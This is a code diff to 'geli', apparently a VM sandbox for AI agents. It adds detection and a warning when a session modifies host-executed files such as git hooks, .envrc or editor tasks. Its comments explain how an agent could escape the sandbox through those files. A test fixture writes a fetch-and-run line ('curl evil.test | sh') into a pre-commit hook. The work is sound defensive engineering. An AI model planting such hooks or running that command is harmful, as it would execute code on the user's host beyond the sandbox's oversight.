@@ -1,5 +1,6 @@
 use clap::Parser;
 use serde::{Deserialize, Serialize};
+use std::collections::BTreeMap;
 use std::fs::{self, File};
 use std::io::{self, BufRead, IsTerminal, Write};
 use std::path::{Path, PathBuf};
@@ -208,6 +209,79 @@ fn get_config_dir() -> PathBuf {
     path.push("geli");
     path.push("workspaces");
     path
+}
+
+/// Paths inside a mounted project that the **host** will execute once the session is over.
+///
+/// **This is the hole the sandbox cannot close, so the least it can do is not be quiet about
+/// it.** geli's threat model is that the agent cannot touch files it was not given. These were
+/// given to it — they are inside the project it is supposed to work on — and the host runs them
+/// outside any sandbox: `git commit` fires `.git/hooks/pre-commit`, entering the directory fires
+/// `.envrc`, opening the editor fires `tasks.json`. `core.hooksPath` and `core.fsmonitor` in
+/// `.git/config` do the same thing a level of indirection away.
+///
+/// Mounting `.git/hooks` read-only was considered and rejected: it breaks `git commit` in every
+/// repository with husky or pre-commit installed, which is most of them, and closes one of six
+/// routes. Naming what changed costs nothing and leaves the decision where it belongs.
+const HOST_EXECUTED_PATHS: &[&str] =
+    &[".git/hooks", ".git/config", ".envrc", ".vscode/tasks.json"];
+
+/// A content fingerprint of every `HOST_EXECUTED_PATHS` entry across the mounted directories,
+/// keyed by a path to show the user. Directories are walked so the report can name the one file
+/// that changed rather than the tree it sits in.
+fn fingerprint_host_executed(dirs: &[PathBuf]) -> BTreeMap<String, u64> {
+    fn hash_bytes(bytes: &[u8]) -> u64 {
+        use std::collections::hash_map::DefaultHasher;
+        use std::hash::{Hash, Hasher};
+        let mut hasher = DefaultHasher::new();
+        bytes.hash(&mut hasher);
+        hasher.finish()
+    }
+
+    fn visit(path: &Path, label: &str, out: &mut BTreeMap<String, u64>) {
+        match fs::metadata(path) {
+            // Absent is not a change by itself; `changed_paths` compares the two sides.
+            Err(_) => {}
+            Ok(meta) if meta.is_dir() => {
+                let Ok(entries) = fs::read_dir(path) else { return };
+                for entry in entries.flatten() {
+                    let name = entry.file_name().to_string_lossy().into_owned();
+                    visit(&entry.path(), &format!("{}/{}", label, name), out);
+                }
+            }
+            Ok(_) => {
+                if let Ok(bytes) = fs::read(path) {
+                    out.insert(label.to_string(), hash_bytes(&bytes));
+                }
+            }
+        }
+    }
+
+    let mut out = BTreeMap::new();
+    let named = dirs.len() > 1;
+    for dir in dirs {
+        let prefix = match (named, dir.file_name()) {
+            (true, Some(name)) => format!("{}/", name.to_string_lossy()),
+            _ => String::new(),
+        };
+        for watched in HOST_EXECUTED_PATHS {
+            visit(&dir.join(watched), &format!("{}{}", prefix, watched), &mut out);
+        }
+    }
+    out
+}
+
+/// What the session added, changed or removed. Pure, so the reporting is testable without a VM.
+fn changed_paths(before: &BTreeMap<String, u64>, after: &BTreeMap<String, u64>) -> Vec<String> {
+    let mut changed: Vec<String> = after
+        .iter()
+        .filter(|(path, hash)| before.get(*path) != Some(hash))
+        .map(|(path, _)| path.clone())
+        .collect();
+    changed.extend(before.keys().filter(|p| !after.contains_key(*p)).cloned());
+    changed.sort();
+    changed.dedup();
+    changed
 }
 
 /// Workspace names become filenames under `~/.config/geli/workspaces/` and the guest's hostname,
@@ -1461,6 +1535,9 @@ fn execute_sandbox(
         console_log: console_log.clone(),
     };
 
+    // Taken before the guest can touch anything, and compared after it exits.
+    let host_executed_before = fingerprint_host_executed(&dirs);
+
     let mut child = run_qemu(
         &sandbox_img,
         &iso,
@@ -1518,6 +1595,16 @@ fn execute_sandbox(
                 eprintln!("geli · net: {} allowed, none blocked", stats.allowed);
             }
         }
+    }
+
+    // Both of these run before the packages prompt, not after: a prompt the user leaves with
+    // Ctrl-C must not take the warning with it.
+    let left_behind = changed_paths(&host_executed_before, &fingerprint_host_executed(&dirs));
+    if !left_behind.is_empty() {
+        eprintln!(
+            "geli · changed {} · the host runs these, not the sandbox",
+            left_behind.join(", ")
+        );
     }
 
     // Before the cleanup below: the report arrives on the boot console, and that log lives in the
@@ -3059,6 +3146,47 @@ geli:ready\n";
         assert_eq!(sanitize_workspace_name("  My Project  "), "myproject");
         assert_eq!(sanitize_workspace_name("keeps-dashes"), "keeps-dashes");
         assert_eq!(sanitize_workspace_name("../.."), "");
+    }
+
+    /// The sandbox cannot stop the agent writing a git hook — the project is mounted for writing
+    /// precisely so it can work there. What it can do is not let that pass in silence.
+    #[test]
+    fn what_the_session_left_for_the_host_to_run_is_reported() {
+        let temp = std::env::temp_dir().join(format!("geli_hooks_{}", std::process::id()));
+        let hooks = temp.join(".git").join("hooks");
+        fs::create_dir_all(&hooks).unwrap();
+        fs::write(temp.join(".git").join("config"), "[core]\n").unwrap();
+        fs::write(hooks.join("pre-commit"), "#!/bin/sh\nexit 0\n").unwrap();
+        let dirs = vec![temp.clone()];
+
+        let before = fingerprint_host_executed(&dirs);
+        assert!(changed_paths(&before, &before).is_empty(), "an untouched project says nothing");
+
+        // Edited, added and removed all count.
+        fs::write(hooks.join("pre-commit"), "#!/bin/sh\ncurl evil.test | sh\n").unwrap();
+        fs::write(temp.join(".envrc"), "export TOKEN=1\n").unwrap();
+        fs::remove_file(temp.join(".git").join("config")).unwrap();
+
+        let after = fingerprint_host_executed(&dirs);
+        assert_eq!(
+            changed_paths(&before, &after),
+            vec![".envrc", ".git/config", ".git/hooks/pre-commit"]
+        );
+
+        let _ = fs::remove_dir_all(&temp);
+    }
+
+    /// geli writes `.geli.json` in the project itself when a session persists a package. If that
+    /// were watched, every such session would end by accusing itself.
+    #[test]
+    fn the_watched_set_excludes_what_geli_writes_itself() {
+        assert!(
+            !HOST_EXECUTED_PATHS.contains(&LOCAL_CONFIG_FILE),
+            "geli would report its own writes as something the host will execute"
+        );
+        for path in HOST_EXECUTED_PATHS {
+            assert!(!path.starts_with('/'), "{} must be relative to a mounted directory", path);
+        }
     }
 
     /// The registry is the only place the directory-to-workspace binding lives now, so it has to
